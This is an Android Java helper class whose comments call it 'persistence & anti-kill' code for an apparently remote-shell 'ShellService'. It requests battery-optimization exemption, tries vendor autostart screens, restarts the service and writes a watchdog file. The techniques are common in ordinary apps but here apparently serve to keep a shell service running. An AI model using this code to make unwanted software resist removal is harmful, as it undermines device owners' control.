package com.java.panel;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.PowerManager;
import android.provider.Settings;
import java.io.File;
import java.io.FileWriter;

/**
 * Persistence & anti-kill helpers:
 * - Battery optimization whitelist request
 * - Autostart vendor intents (Xiaomi, Huawei, Oppo, Vivo, etc.)
 * - Watchdog ping file
 * - Restart ShellService
 */
public class PersistHelper {

    public static String requestIgnoreBattery(Context ctx) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                PowerManager pm = (PowerManager) ctx.getSystemService(Context.POWER_SERVICE);
                String pkg = ctx.getPackageName();
                if (pm != null && !pm.isIgnoringBatteryOptimizations(pkg)) {
                    Intent i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                    i.setData(Uri.parse("package:" + pkg));
                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    ctx.startActivity(i);
                    return "🔋 Battery optimization whitelist dialog opened.";
                }
                return "✅ Already ignoring battery optimizations.";
            }
            return "✅ Not required on this Android version.";
        } catch (Exception e) {
            return "❌ " + e.getMessage();
        }
    }

    public static String openAutostartSettings(Context ctx) {
        String[][] intents = {
                {"com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity"},
                {"com.huawei.systemmanager", "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity"},
                {"com.huawei.systemmanager", "com.huawei.systemmanager.optimize.process.ProtectActivity"},
                {"com.coloros.safecenter", "com.coloros.safecenter.permission.startup.StartupAppListActivity"},
                {"com.oppo.safe", "com.oppo.safe.permission.startup.StartupAppListActivity"},
                {"com.iqoo.secure", "com.iqoo.secure.ui.phoneoptimize.AddWhiteListActivity"},
                {"com.vivo.permissionmanager", "com.vivo.permissionmanager.activity.BgStartUpManagerActivity"},
                {"com.samsung.android.lool", "com.samsung.android.sm.battery.ui.BatteryActivity"},
                {"com.oneplus.security", "com.oneplus.security.chainlaunch.view.ChainLaunchAppListActivity"},
        };
        for (String[] pair : intents) {
            try {
                Intent i = new Intent();
                i.setComponent(new ComponentName(pair[0], pair[1]));
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                ctx.startActivity(i);
                return "📱 Autostart settings opened: " + pair[0];
            } catch (Exception ignored) {}
        }
        try {
            Intent i = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
            i.setData(Uri.parse("package:" + ctx.getPackageName()));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(i);
            return "📱 App details opened (set Autostart / Background manually).";
        } catch (Exception e) {
            return "❌ Could not open autostart settings: " + e.getMessage();
        }
    }

    public static String restartService(Context ctx) {
        try {
            Intent i = new Intent(ctx, ShellService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                ctx.startForegroundService(i);
            } else {
                ctx.startService(i);
            }
            return "✅ ShellService restart requested.";
        } catch (Exception e) {
            return "❌ " + e.getMessage();
        }
    }

    public static String writeWatchdog(Context ctx) {
        try {
            File f = new File(ShellService.TARGET_DIR, "watchdog.ping");
            FileWriter fw = new FileWriter(f, false);
            fw.write(String.valueOf(System.currentTimeMillis()));
            fw.close();
            return "✅ Watchdog ping written.";
        } catch (Exception e) {
            return "❌ " + e.getMessage();
        }
    }

    public static String status(Context ctx) {
        StringBuilder sb = new StringBuilder();
        sb.append("🛡️ Persistence status\n");
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                PowerManager pm = (PowerManager) ctx.getSystemService(Context.POWER_SERVICE);
                boolean ign = pm != null && pm.isIgnoringBatteryOptimizations(ctx.getPackageName());
                sb.append("• Battery whitelist: ").append(ign ? "YES" : "NO").append("\n");
            }
            sb.append("• Service running: ").append(ShellService.instance != null ? "YES" : "NO").append("\n");
            File ping = new File(ShellService.TARGET_DIR, "watchdog.ping");
            sb.append("• Watchdog file: ").append(ping.exists() ? "YES" : "NO").append("\n");
        } catch (Exception e) {
            sb.append("❌ ").append(e.getMessage());
        }
        return sb.toString();
    }
}
